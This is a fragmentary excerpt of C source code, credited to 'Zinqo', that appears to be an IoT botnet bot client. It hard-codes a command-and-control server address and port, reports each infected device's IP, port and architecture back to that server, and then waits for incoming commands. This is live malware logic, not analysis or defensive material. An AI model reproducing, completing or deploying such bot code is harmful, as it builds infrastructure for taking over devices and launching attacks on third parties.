...
//Made By Zinqo.
unsigned char *commServer[] = {"34.70.167.81:5876"};
...
int main(int argc, unsigned char *argv[])
{
        ...
        while(1)
        {
                ...
                sockprintf(mainCommSock, "\e[1;94mDevice Connected: %s | Port: %s | Arch: %s\e[0m", inet_ntoa(ourIP), getPortz(), getArch());//Made By Zinqo.
                char commBuf[4096];
                int got = 0;
                int i = 0;
